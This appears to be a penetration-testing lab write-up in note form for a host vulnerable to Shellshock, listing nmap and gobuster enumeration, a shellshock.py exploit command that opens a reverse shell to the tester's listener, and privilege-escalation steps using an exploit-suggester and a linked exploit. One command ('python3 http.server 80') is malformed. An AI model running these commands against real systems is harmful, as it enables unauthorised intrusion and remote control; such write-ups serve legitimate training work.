---
tags:
  - ShellShock
---

# Recon

```zsh
sudo nmap -Pn -p- -sS --open 192.168.103.87 --min-rate=5000
```

```zsh
sudo nmap -Pn -sVC -p22,80 192.168.103.87
```

![[Pasted image 20261128204950.png]]

# Enum

## 80

```zsh
gobuster dir -u http://192.168.219.87 -w /usr/share/dirb/wordlists/common.txt
```

![[Pasted image 20261128213959.png]]
- index
- cgi-bin/

http://192.168.219.87/index

![[Pasted image 20261128204727.png]]

```zsh
gobuster dir -u http://192.168.219.87/cgi-bin -w /usr/share/dirb/wordlists/common.txt
```

![[Pasted image 20261128213918.png]]
- test

http://192.168.219.87/cgi-bin/test

![[Pasted image 20261128214235.png]]

```zsh
nikto -h http://192.168.219.87
```

# Initial Access

```zsh
python3 shellshock.py 192.168.45.235 443 http://192.168.219.87/cgi-bin/test
```

![[Pasted image 20261128214352.png]]

```zsh
~/Tools/RevShell/penelope/penelope.py -p 443
```

![[Pasted image 20261128214436.png]]

# Privilege Escalation

```zsh
git clone https://github.com/The-Z-Labs/linux-exploit-suggester.git 
cd linux-exploit-suggester
python3 http.server 80
```

![[Pasted image 20261128215953.png]]

https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54

![[Pasted image 20261128220625.png]]